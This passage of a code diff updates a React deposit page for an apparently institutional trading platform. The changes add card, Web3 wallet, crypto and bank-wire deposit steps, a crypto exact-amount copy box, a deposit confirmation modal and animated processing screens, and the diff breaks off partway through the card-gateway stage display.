+              <span className="hidden sm:inline">Back</span>
+            </button>
+            
+            <div className="flex-1 flex justify-center mx-2 sm:mx-4 select-none">
+              <div className={`flex items-center justify-center gap-2.5 sm:gap-3 px-8 sm:px-12 py-3 sm:py-3.5 rounded-2xl min-w-[280px] sm:min-w-[340px] transition-all whitespace-nowrap ${
+                isDark ? 'bg-white/5 ring-1 ring-white/10 shadow-lg shadow-black/20' : 'bg-slate-100 ring-1 ring-slate-200 shadow-sm'
+              }`}>
+                <AnimatedHeaderIcons isDark={isDark} />
 
-              <span className={`text-xs sm:text-sm font-black tracking-wider uppercase bg-gradient-to-r ${
-                isDark ? 'from-white via-slate-100 to-slate-300' : 'from-slate-900 via-slate-800 to-slate-700'
-              } text-transparent bg-clip-text`}>
-                {step === 'form' ? (
-                  selectedMethod === 'card' ? 'Credit / Debit Card' :
-                  selectedMethod === 'walletconnect' ? 'Web3 Self-Custody' :
-                  selectedMethod === 'crypto' ? 'Crypto Cold Storage' : 'Bank Wire Transfer'
-                ) : 'Deposit Funds'}
-              </span>
+                <span className={`text-xs sm:text-sm font-black uppercase select-none ${
+                  isDark ? 'text-white' : 'text-slate-900'
+                } ${step !== 'form' ? 'tracking-[0.35em]' : 'tracking-wider'}`}>
+                  {step === 'form' ? (
+                    selectedMethod === 'card' ? 'Credit / Debit Card' :
+                    selectedMethod === 'walletconnect' ? 'Web3 Self-Custody' :
+                    selectedMethod === 'crypto' ? 'Crypto Cold Storage' : 'Bank Wire Transfer'
+                  ) : 'Deposit Funds'}
+                </span>
+              </div>
             </div>
-          </div>
 
-          <div className="w-[68px] sm:w-[94px] hidden sm:block" />
+            <div className="w-[68px] sm:w-[94px] hidden sm:block" />
+          </div>
         </div>
-      </div>
+      )}
 
       <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-24 pb-32 relative z-10">
 
@@ -531,7 +1541,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                     
                     {/* 1. Debit / Credit Card (Emerald Theme) */}
                     <div 
-                      onClick={() => { setSelectedMethod('card'); setStep('form'); }}
+                      onClick={handleSelectCardMethod}
                       className="group relative overflow-hidden rounded-2xl bg-neutral-900/90 p-6 text-white shadow-xl transition-all duration-300 hover:-translate-y-0.5 hover:shadow-2xl ring-1 ring-white/10 border-t border-white/20 cursor-pointer"
                     >
                       {/* Texture Layer (SVG Noise) */}
@@ -568,7 +1578,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
                         {/* Action Link */}
                         <div className="mt-5 flex items-center gap-1.5 text-xs font-semibold text-emerald-400 group-hover:text-emerald-300 transition-colors">
-                          <span>Select Method</span>
+                          <span>Proceed</span>
                           <svg className="h-3.5 w-3.5 transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 5l7 7-7 7" />
                           </svg>
@@ -578,7 +1588,14 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
                     {/* 2. WalletConnect (Indigo Theme) */}
                     <div 
-                      onClick={() => { setSelectedMethod('walletconnect'); setStep('form'); }}
+                      onClick={() => {
+                        setSelectedMethod('walletconnect');
+                        if (walletConnected && connectedAddress && !ignoreExistingWallet) {
+                          setStep('existing_wallet_detected');
+                        } else {
+                          setStep('form');
+                        }
+                      }}
                       className="group relative overflow-hidden rounded-2xl bg-neutral-900/90 p-6 text-white shadow-xl transition-all duration-300 hover:-translate-y-0.5 hover:shadow-2xl ring-1 ring-white/10 border-t border-white/20 cursor-pointer"
                     >
                       {/* Texture Layer */}
@@ -595,9 +1612,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                         <div className="flex items-center justify-between mb-5">
                           {/* Icon Tray */}
                           <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-indigo-500/10 text-indigo-400 ring-1 ring-indigo-500/30 shadow-[inset_0_1px_2px_rgba(255,255,255,0.1)]">
-                            <svg className="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
-                            </svg>
+                            <Wallet className="h-6 w-6 text-indigo-400" />
                           </div>
                           {/* Badge */}
                           <span className="rounded-full bg-white/5 px-3 py-1 text-xs font-medium text-neutral-300 ring-1 ring-white/10 backdrop-blur-md">
@@ -615,7 +1630,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
                         {/* Action Link */}
                         <div className="mt-5 flex items-center gap-1.5 text-xs font-semibold text-indigo-400 group-hover:text-indigo-300 transition-colors">
-                          <span>Select Method</span>
+                          <span>Proceed</span>
                           <svg className="h-3.5 w-3.5 transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 5l7 7-7 7" />
                           </svg>
@@ -662,7 +1677,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
                         {/* Action Link */}
                         <div className="mt-5 flex items-center gap-1.5 text-xs font-semibold text-amber-400 group-hover:text-amber-300 transition-colors">
-                          <span>Select Method</span>
+                          <span>Proceed</span>
                           <svg className="h-3.5 w-3.5 transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 5l7 7-7 7" />
                           </svg>
@@ -672,7 +1687,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
                     {/* 4. Bank Wire Transfer (Purple Theme) */}
                     <div 
-                      onClick={() => { setSelectedMethod('bank'); setStep('form'); }}
+                      onClick={() => { setSelectedMethod('bank'); setStep('bank_preparing'); }}
                       className="group relative overflow-hidden rounded-2xl bg-neutral-900/90 p-6 text-white shadow-xl transition-all duration-300 hover:-translate-y-0.5 hover:shadow-2xl ring-1 ring-white/10 border-t border-white/20 cursor-pointer"
                     >
                       {/* Texture Layer */}
@@ -709,7 +1724,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
                         {/* Action Link */}
                         <div className="mt-5 flex items-center gap-1.5 text-xs font-semibold text-purple-400 group-hover:text-purple-300 transition-colors">
-                          <span>Select Method</span>
+                          <span>Proceed</span>
                           <svg className="h-3.5 w-3.5 transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 5l7 7-7 7" />
                           </svg>
@@ -748,15 +1763,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                     <form onSubmit={handleStartProcessing} className="relative z-20 flex flex-col justify-between h-full space-y-6">
                       {/* Header */}
                       <div className="flex items-center justify-between pb-6 border-b border-white/10">
-                        <button 
-                          type="button"
-                          onClick={() => setStep('methods')} 
-                          className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 hover:bg-white/10 active:scale-95 transition"
-                          title="Back to methods"
-                        >
-                          <ArrowLeft className="h-5 w-5 text-white" />
-                        </button>
-                        <div className="text-center">
+                        <div className="text-left">
                           <h2 className="text-base sm:text-lg font-bold tracking-tight text-white">Credit / Debit Card</h2>
                           <p className="text-[11px] text-neutral-400">Configure parameters & routing</p>
                         </div>
@@ -890,11 +1897,6 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                             </label>
                           </div>
                         </div>
-
-                        <div className="p-3.5 rounded-xl bg-emerald-500/10 ring-1 ring-emerald-500/20 flex items-center gap-3 text-xs text-emerald-400">
-                          <ShieldCheck className="w-5 h-5 flex-shrink-0" />
-                          <span>3D Secure 2.0 encrypted transmission. Zero liability institutional clearing active.</span>
-                        </div>
                       </div>
 
                       {/* Action Footer */}
@@ -919,15 +1921,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                     <div className="relative z-20 flex flex-col justify-between h-full space-y-6">
                       {/* Header */}
                       <div className="flex items-center justify-between pb-6 border-b border-white/10">
-                        <button 
-                          type="button"
-                          onClick={() => setStep('methods')} 
-                          className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 hover:bg-white/10 active:scale-95 transition"
-                          title="Back to methods"
-                        >
-                          <ArrowLeft className="h-5 w-5 text-white" />
-                        </button>
-                        <div className="text-center">
+                        <div className="text-left sm:text-center flex-1">
                           <h2 className="text-base sm:text-lg font-bold tracking-tight text-white">Connect Self-Custody</h2>
                           <p className="text-[11px] text-neutral-400">Establish cryptographic session</p>
                         </div>
@@ -938,20 +1932,6 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
                       {/* Main Content */}
                       <div className="flex-1 space-y-6 my-2">
-                        {/* Amount Input Block */}
-                        <div className="space-y-3">
-                          <label className="text-xs font-bold tracking-wider text-neutral-400 uppercase">Deposit Amount (USD)</label>
-                          <div className="flex items-center rounded-2xl bg-neutral-900/90 px-4 py-3.5 ring-1 ring-white/10 border-t border-white/15 shadow-inner">
-                            <span className="text-xl font-bold text-indigo-400 mr-2">$</span>
-                            <input 
-                              type="number" 
-                              value={amount} 
-                              onChange={(e) => setAmount(Number(e.target.value))}
-                              className="w-full bg-transparent text-2xl font-bold text-white outline-none" 
-                            />
-                          </div>
-                        </div>
-
                         {!walletConnected ? (
                           <div className="space-y-3">
                             <p className="text-xs text-neutral-400 font-medium">Select your preferred provider:</p>
@@ -983,24 +1963,49 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                             </div>
                           </div>
                         ) : (
-                          <div className="p-6 rounded-2xl bg-indigo-950/40 ring-1 ring-indigo-500/40 space-y-4">
+                          <div className="p-6 rounded-2xl bg-indigo-950/40 ring-1 ring-indigo-500/40 border border-indigo-500/30 space-y-4 shadow-xl">
                             <div className="flex items-center justify-between">
-                              <div className="flex items-center gap-3">
-                                <span className="w-3 h-3 rounded-full bg-indigo-400 animate-pulse" />
-                                <span className="text-xs font-bold text-indigo-300 uppercase tracking-widest">
-                                  Cryptographic Session Active ({selectedWallet})
+                              <div className="flex items-center gap-2.5">
+                                <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
+                                <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider bg-emerald-500/10 px-2.5 py-0.5 rounded-full border border-emerald-500/30">
+                                  Connected
+                                </span>
+                                <span className="text-xs font-bold text-white">
+                                  {selectedWallet}
                                 </span>
                               </div>
-                              <button onClick={() => setWalletConnected(false)} className="text-xs text-indigo-400 hover:underline">Disconnect</button>
+                              <button 
+                                onClick={() => {
+                                  setWalletConnected(false);
+                                  setConnectedAddress('');
+                                }} 
+                                className="text-xs font-bold text-indigo-400 hover:text-indigo-300 hover:underline transition"
+                              >
+                                Disconnect
+                              </button>
                             </div>
-                            <div className="grid grid-cols-2 gap-4 pt-2 border-t border-indigo-500/20 text-xs">
+
+                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-3 border-t border-indigo-500/20 text-xs">
                               <div>
-                                <span className="text-neutral-400 block mb-1">Vault Address</span>
-                                <strong className="font-mono text-white text-sm">{connectedAddress}</strong>
+                                <span className="text-neutral-400 block text-[11px] mb-1">Public Wallet Address</span>
+                                <div className="flex items-center justify-between gap-2 font-mono text-white text-sm font-bold bg-black/40 p-2.5 rounded-xl border border-white/10">
+                                  <span className="truncate">{abbreviateAddress(connectedAddress)}</span>
+                                  <button 
+                                    type="button"
+                                    onClick={() => handleCopy(connectedAddress)}
+                                    className="p-1.5 rounded text-indigo-400 hover:text-indigo-300 hover:bg-white/5 transition"
+                                    title="Copy full address"
+                                  >
+                                    {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                                  </button>
+                                </div>
                               </div>
                               <div>
-                                <span className="text-neutral-400 block mb-1">Network Protocol</span>
-                                <strong className="text-white text-sm">Web3 Multi-Sig Mainnet</strong>
+                                <span className="text-neutral-400 block text-[11px] mb-1">Connected Network</span>
+                                <div className="font-semibold text-white text-sm bg-black/40 p-2.5 rounded-xl border border-white/10 flex items-center justify-between">
+                                  <span>{connectedNetwork || 'Ethereum (ERC-20)'}</span>
+                                  <span className="text-[10px] font-bold text-indigo-400 bg-indigo-500/10 px-2 py-0.5 rounded border border-indigo-500/20">Active</span>
+                                </div>
                               </div>
                             </div>
                           </div>
@@ -1009,13 +2014,15 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
                       {/* Action Footer */}
                       <div className="pt-4 border-t border-white/10 space-y-2">
-                        <button 
-                          onClick={handleStartProcessing}
-                          className="w-full rounded-xl bg-indigo-600 py-4 text-sm font-bold text-white shadow-lg shadow-indigo-600/30 hover:bg-indigo-500 active:scale-[0.98] transition flex items-center justify-center gap-2"
-                        >
-                          <span>Confirm & Deposit via Web3 (${amount.toLocaleString()})</span>
-                          <ChevronRight className="w-4 h-4" />
-                        </button>
+                        {walletConnected && (
+                          <button 
+                            onClick={handleStartProcessing}
+                            className="w-full rounded-xl bg-indigo-600 py-4 text-sm font-bold text-white shadow-lg shadow-indigo-600/30 hover:bg-indigo-500 active:scale-[0.98] transition flex items-center justify-center gap-2"
+                          >
+                            <span>Confirm & Deposit via Web3</span>
+                            <ChevronRight className="w-4 h-4" />
+                          </button>
+                        )}
                         <p className="text-center text-[11px] text-neutral-500">Secured via end-to-end multi-sig session protocol</p>
                       </div>
                     </div>
@@ -1026,15 +2033,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                     <div className="relative z-20 flex flex-col justify-between h-full space-y-6">
                       {/* Header */}
                       <div className="flex items-center justify-between pb-6 border-b border-white/10">
-                        <button 
-                          type="button"
-                          onClick={() => setStep('methods')} 
-                          className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 hover:bg-white/10 active:scale-95 transition"
-                          title="Back to methods"
-                        >
-                          <ArrowLeft className="h-5 w-5 text-white" />
-                        </button>
-                        <div className="text-center">
+                        <div>
                           <h2 className="text-base sm:text-lg font-bold tracking-tight text-white">Crypto Cold Storage</h2>
                           <p className="text-[11px] text-neutral-400">Segregated vault deposit</p>
                         </div>
@@ -1047,7 +2046,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                       <div className="flex-1 space-y-6 my-2">
                         {/* Amount Selection */}
                         <div className="space-y-3">
-                          <label className="text-xs font-bold tracking-wider text-neutral-400 uppercase">Target Amount (USD Equivalent)</label>
+                          <label className="text-xs font-bold tracking-wider text-neutral-400 uppercase">Amount</label>
                           <div className="flex items-center rounded-2xl bg-neutral-900/90 px-4 py-3.5 ring-1 ring-white/10 border-t border-white/15 shadow-inner">
                             <span className="text-xl font-bold text-amber-400 mr-2">$</span>
                             <input 
@@ -1081,6 +2080,83 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                                 <span>{asset.symbol}</span>
                               </button>
                             ))}
+                          </div>
+                        </div>
+
+                        {/* Exact Transfer Amount */}
+                        <div className="space-y-2">
+                          <label className="text-xs font-bold tracking-wider text-neutral-400 uppercase">You Will Send</label>
+                          <div className="rounded-xl bg-neutral-900/90 ring-1 ring-white/10 border-t border-white/15 shadow-xl p-4 overflow-hidden relative">
+                            {/* Subtle Floating Amount Copied Toast */}
+                            <AnimatePresence>
+                              {copiedExactAmount && (
+                                <motion.div
+                                  initial={{ opacity: 0, y: 10, scale: 0.95 }}
+                                  animate={{ opacity: 1, y: 0, scale: 1 }}
+                                  exit={{ opacity: 0, y: 10, scale: 0.95 }}
+                                  className="absolute top-2 right-2 z-50 flex items-center gap-1 px-2.5 py-1 rounded-full bg-zinc-950/95 border border-zinc-800 text-emerald-400 text-[10px] font-bold shadow-md backdrop-blur"
+                                >
+                                  <Check className="w-3 h-3 stroke-[2.5]" />
+                                  <span>Amount copied</span>
+                                </motion.div>
+                              )}
+                            </AnimatePresence>
+
+                            {/* Asset Info Header Row */}
+                            <div className="flex items-center gap-2.5 relative z-10">
+                              <div className="w-8 h-8 rounded-full bg-neutral-800 ring-1 ring-white/10 flex items-center justify-center flex-shrink-0 shadow-inner">
+                                <CryptoLogo symbol={selectedCrypto.symbol} className="w-5 h-5" />
+                              </div>
+                              <div className="flex flex-col">
+                                <span className="text-sm font-bold text-white leading-tight">
+                                  {selectedCrypto.name}
+                                </span>
+                                <span className="text-xs text-neutral-400 font-medium leading-none mt-0.5">
+                                  {selectedCrypto.network}
+                                </span>
+                              </div>
+                            </div>
+
+                            {/* Exact Crypto Amount + Copy Button */}
+                            <div className="mt-3 flex items-center justify-between gap-4 relative z-10">
+                              {isPricingLoading ? (
+                                <div className="h-10 w-44 bg-white/5 rounded animate-pulse" />
+                              ) : pricingError ? (
+                                <div className="text-sm text-red-400 font-medium">Unable to retrieve exchange rate.</div>
+                              ) : (
+                                <div className="flex-1 min-w-0">
+                                  <div className="flex items-baseline gap-1.5">
+                                    <span className="text-xl sm:text-2xl font-bold text-white tracking-tight leading-none break-all">
+                                      {formatExactAmount(exactCryptoAmount, selectedCrypto.symbol)}
+                                    </span>
+                                    <span className="text-lg font-semibold text-neutral-400 leading-none">
+                                      {selectedCrypto.symbol.split('-')[0]}
+                                    </span>
+                                  </div>
+                                </div>
+                              )}
+
+                              <button
+                                type="button"
+                                onClick={() => {
+                                  navigator.clipboard.writeText(formatExactAmount(exactCryptoAmount, selectedCrypto.symbol));
+                                  setCopiedExactAmount(true);
+                                  setTimeout(() => setCopiedExactAmount(false), 2000);
+                                }}
+                                className="px-2.5 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-neutral-300 hover:text-white transition-colors cursor-pointer flex items-center gap-1.5 flex-shrink-0"
+                                title="Copy Exact Amount"
+                              >
+                                <Copy className="w-3.5 h-3.5" />
+                                <span className="text-xs font-semibold">Copy</span>
+                              </button>
+                            </div>
+
+                            {/* Concise Disclaimer Footer */}
+                            <div className="mt-3 pt-3 border-t border-white/5 relative z-10">
+                              <p className="text-xs text-neutral-400 leading-normal">
+                                Send only this exact amount using the selected network.
+                              </p>
+                            </div>
                           </div>
                         </div>
 
@@ -1136,13 +2212,57 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                       {/* Action Footer */}
                       <div className="pt-4 border-t border-white/10">
                         <button 
-                          onClick={handleStartProcessing}
-                          className="w-full rounded-xl bg-amber-500 py-4 text-sm font-bold text-black shadow-lg shadow-amber-500/25 hover:bg-amber-400 active:scale-[0.98] transition flex items-center justify-center gap-2"
+                          onClick={() => setShowConfirmDepositModal(true)}
+                          disabled={pricingError}
+                          className={`w-full rounded-xl py-4 text-sm font-bold shadow-lg transition flex items-center justify-center gap-2 ${
+                            pricingError 
+                              ? 'bg-neutral-800 text-neutral-500 cursor-not-allowed shadow-none' 
+                              : 'bg-amber-500 text-black shadow-amber-500/25 hover:bg-amber-400 active:scale-[0.98] cursor-pointer'
+                          }`}
                         >
-                          <span>I Have Deposited {selectedCrypto.symbol}</span>
+                          <span>{pricingError ? 'Exchange Rate Unavailable' : `I Have Deposited ${selectedCrypto.symbol}`}</span>
                           <ChevronRight className="w-4 h-4" />
                         </button>
                       </div>
+                    </div>
+                  )}
+
+                  {/* Confirm Deposit Modal */}
+                  {showConfirmDepositModal && (
+                    <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
+                      <motion.div
+                        initial={{ opacity: 0, scale: 0.95 }}
+                        animate={{ opacity: 1, scale: 1 }}
+                        exit={{ opacity: 0, scale: 0.95 }}
+                        className="w-full max-w-md rounded-2xl bg-neutral-950 border border-white/10 p-6 shadow-2xl text-white space-y-6"
+                      >
+                        <div className="space-y-2 text-center">
+                          <h3 className="text-xl font-bold tracking-tight text-white">Confirm Deposit</h3>
+                          <p className="text-xs text-neutral-400 leading-relaxed">
+                            Please confirm that you have completed the transfer to the displayed wallet address. Once confirmed, your deposit request will be submitted for verification.
+                          </p>
+                        </div>
+
+                        <div className="space-y-3 pt-2">
+                          <button
+                            type="button"
+                            onClick={() => {
+                              setShowConfirmDepositModal(false);
+                              handleStartProcessing();
+                            }}
+                            className="w-full py-3.5 rounded-xl bg-white text-black font-bold text-sm hover:bg-neutral-200 transition cursor-pointer"
+                          >
+                            I Have Deposited {selectedCrypto?.symbol || 'Crypto'}
+                          </button>
+                          <button
+                            type="button"
+                            onClick={() => setShowConfirmDepositModal(false)}
+                            className="w-full py-3.5 rounded-xl bg-white/5 border border-white/10 text-neutral-300 font-semibold text-sm hover:bg-white/10 transition cursor-pointer"
+                          >
+                            Cancel
+                          </button>
+                        </div>
+                      </motion.div>
                     </div>
                   )}
 
@@ -1151,15 +2271,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                     <div className="relative z-20 flex flex-col justify-between h-full space-y-6">
                       {/* Header */}
                       <div className="flex items-center justify-between pb-6 border-b border-white/10">
-                        <button 
-                          type="button"
-                          onClick={() => setStep('methods')} 
-                          className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 hover:bg-white/10 active:scale-95 transition"
-                          title="Back to methods"
-                        >
-                          <ArrowLeft className="h-5 w-5 text-white" />
-                        </button>
-                        <div className="text-center">
+                        <div className="text-left">
                           <h2 className="text-base sm:text-lg font-bold tracking-tight text-white">Bank Wire Transfer</h2>
                           <p className="text-[11px] text-neutral-400">Institutional clearing details</p>
                         </div>
@@ -1262,58 +2374,317 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                 </motion.div>
               )}
 
-              {/* STEP 3: PROCESSING EXPERIENCE */}
+              {/* STEP 3: PROCESSING EXPERIENCE (Minimalist Black & White) */}
               {step === 'processing' && (
+                <div className="fixed inset-0 z-50 bg-black text-white flex flex-col justify-between p-6 sm:p-12 overflow-hidden select-none">
+                  {/* Top Bar: Small X button */}
+                  <div className="flex items-center justify-between">
+                    <button
+                      type="button"
+                      onClick={() => setStep('methods')}
+                      className="w-10 h-10 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white hover:bg-white/10 transition cursor-pointer"
+                      title="Cancel"
+                    >
+                      <X className="w-5 h-5 text-white" />
+                    </button>
+                    <span className="text-xs font-mono uppercase tracking-widest text-neutral-500">
+                      Session Initialization
+                    </span>
+                    <div className="w-10" />
+                  </div>
+
+                  {/* Center Content */}
+                  <div className="flex flex-col items-center justify-center space-y-6 max-w-md mx-auto text-center my-auto">
+                    {/* Refined monochrome animated indicator (3 subtle dots) */}
+                    <div className="flex items-center gap-2 mb-2">
+                      <motion.div
+                        animate={{ scale: [1, 1.4, 1], opacity: [0.3, 1, 0.3] }}
+                        transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut", delay: 0 }}
+                        className="w-2 h-2 rounded-full bg-white"
+                      />
+                      <motion.div
+                        animate={{ scale: [1, 1.4, 1], opacity: [0.3, 1, 0.3] }}
+                        transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut", delay: 0.2 }}
+                        className="w-2 h-2 rounded-full bg-white"
+                      />
+                      <motion.div
+                        animate={{ scale: [1, 1.4, 1], opacity: [0.3, 1, 0.3] }}
+                        transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut", delay: 0.4 }}
+                        className="w-2 h-2 rounded-full bg-white"
+                      />
+                    </div>
+
+                    <div className="space-y-2">
+                      <h2 className="text-xl sm:text-2xl font-medium tracking-tight text-white">
+                        Preparing Deposit Verification
+                      </h2>
+                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed">
+                        Please wait while we register your deposit request and prepare a verification session.
+                      </p>
+                    </div>
+
+                    {/* Live Status Message with Smooth Fade */}
+                    <div className="h-8 flex items-center justify-center">
+                      <AnimatePresence mode="wait">
+                        <motion.p
+                          key={processingStepIndex}
+                          initial={{ opacity: 0, y: 4 }}
+                          animate={{ opacity: 1, y: 0 }}
+                          exit={{ opacity: 0, y: -4 }}
+                          transition={{ duration: 0.3 }}
+                          className="text-xs font-mono text-neutral-300 tracking-wide"
+                        >
+                          {processingStepsList[processingStepIndex]}
+                        </motion.p>
+                      </AnimatePresence>
+                    </div>
+                  </div>
+
+                  {/* Bottom Footer Note */}
+                  <div className="text-center pb-2">
+                    <span className="text-[11px] font-mono text-neutral-600">AVER Institutional Clearing</span>
+                  </div>
+                </div>
+              )}
+
+              {/* STEP 3.5: CARD GATEWAY INITIALIZING & STAGES */}
+              {step === 'card_gateway_processing' && (
                 <motion.div 
-                  key="processing"
-                  initial={{ opacity: 0, scale: 0.95 }}
+                  key="card_gateway_processing"
+                  initial={{ opacity: 0, scale: 0.98 }}
                   animate={{ opacity: 1, scale: 1 }}
-                  exit={{ opacity: 0, scale: 0.95 }}
-                  className={`p-12 rounded-[32px] border text-center space-y-8 ${
-                    isDark ? 'bg-slate-900/90 border-white/10 backdrop-blur-xl' : 'bg-white border-slate-200 shadow-2xl'
-                  }`}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-8"
                 >
-                  <div className="w-20 h-20 mx-auto rounded-3xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 relative">
-                    <RefreshCw className="w-10 h-10 animate-spin" />
-                    <div className="absolute inset-0 rounded-3xl bg-emerald-500/20 blur-xl animate-pulse" />
+                  {/* Subtle moving light effects */}
+                  <div className="pointer-events-none absolute inset-0 opacity-20">
+                    <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-96 h-96 rounded-full bg-emerald-500/20 blur-[120px] animate-pulse" />
+                    <div className="absolute bottom-10 left-10 w-64 h-64 rounded-full bg-blue-500/10 blur-[100px]" />
                   </div>
 
-                  <div className="space-y-2">
-                    <h2 className="text-2xl font-black tracking-tight">{selectedMethod === 'card' ? cardStepsList[processingStepIndex] : processingStepsList[processingStepIndex]}</h2>
-                    <p className="text-xs text-slate-400">Please do not close or refresh this window during secure transmission.</p>
+                  {/* Header / Top */}
+                  <div className="text-center space-y-3 relative z-10 max-w-xl mx-auto">
+                    <div className="w-16 h-16 mx-auto rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 relative shadow-inner">
+                      {cardStageFailed ? (
+                        <WifiOff className="w-8 h-8 text-rose-500 animate-bounce" />
+                      ) : (
+                        <ShieldCheck className="w-8 h-8 text-emerald-400 animate-pulse" />
+                      )}
+                      <div className={`absolute inset-0 rounded-2xl blur-lg ${cardStageFailed ? 'bg-rose-500/20' : 'bg-emerald-500/20'}`} />
+                    </div>
+
+                    <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
+                      Preparing Secure Payment
+                    </h2>
+                    <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed">
+                      Please wait while we establish a secure connection to begin your card transaction.
+                    </p>
                   </div>
 
-                  <div className="max-w-md mx-auto w-full bg-white/5 rounded-full h-2 overflow-hidden border border-white/10">
-                    <motion.div 
-                      className="bg-emerald-500 h-full rounded-full"
-                      initial={{ width: '0%' }}
-                      animate={{ width: `${((processingStepIndex + 1) / (selectedMethod === 'card' ? cardStepsList.length : processingStepsList.length)) * 100}%` }}
-                      transition={{ duration: 0.5 }}
-                    />
+                  {/* Large Circular Animated Progress Indicator */}
+                  <div className="relative z-10 flex flex-col items-center justify-center py-4">
+                    <div className="relative w-44 h-44 flex items-center justify-center">
+                      {/* Outer spinning ring */}
+                      <svg className="w-full h-full transform -rotate-90">
+                        <circle
+                          cx="88"
+                          cy="88"
+                          r="76"
+                          stroke="currentColor"
+                          strokeWidth="8"
+                          className="text-neutral-900"
+                          fill="transparent"
+                        />
+                        <motion.circle
+                          cx="88"
+                          cy="88"
+                          r="76"
+                          stroke="currentColor"
+                          strokeWidth="8"
+                          className={cardStageFailed ? "text-rose-500" : "text-emerald-400"}
+                          fill="transparent"
+                          strokeDasharray="477"
+                          initial={{ strokeDashoffset: 477 }}
+                          animate={{ strokeDashoffset: 477 - (477 * (cardStage / 5)) }}
+                          transition={{ duration: 0.8, ease: "easeInOut" }}
+                          strokeLinecap="round"
+                        />
+                      </svg>
+
+                      {/* Inner Stage Icon Display & Stage Animations */}
+                      <div className="absolute inset-0 flex flex-col items-center justify-center p-4 text-center space-y-1">
+                        {cardStage === 1 && (
+                          <div className="space-y-1 flex flex-col items-center">
+                            <Lock className="w-8 h-8 text-emerald-400 animate-bounce" />
+                            <span className="text-[10px] font-bold tracking-widest text-emerald-400 uppercase">Securing</span>
+                          </div>
+                        )}
+                        {cardStage === 2 && (
+                          <div className="space-y-1 flex flex-col items-center">
+                            <Radio className="w-8 h-8 text-emerald-400 animate-pulse" />
+                            <span className="text-[10px] font-bold tracking-widest text-emerald-400 uppercase">Gateway</span>
+                          </div>
+                        )}
+                        {cardStage === 3 && (
+                          <div className="space-y-1 flex flex-col items-center">
+                            <KeyRound className="w-8 h-8 text-emerald-400 animate-spin" />
+                            <span className="text-[10px] font-bold tracking-widest text-emerald-400 uppercase">Encrypting</span>
+                          </div>
+                        )}
+                        {cardStage === 4 && (
+                          <div className="space-y-1 flex flex-col items-center">
+                            <CreditCard className="w-8 h-8 text-emerald-400 animate-pulse" />
+                            <span className="text-[10px] font-bold tracking-widest text-emerald-400 uppercase">Authorizing</span>
+                          </div>
+                        )}
+                        {cardStage === 5 && (
+                          <div className="space-y-1 flex flex-col items-center">
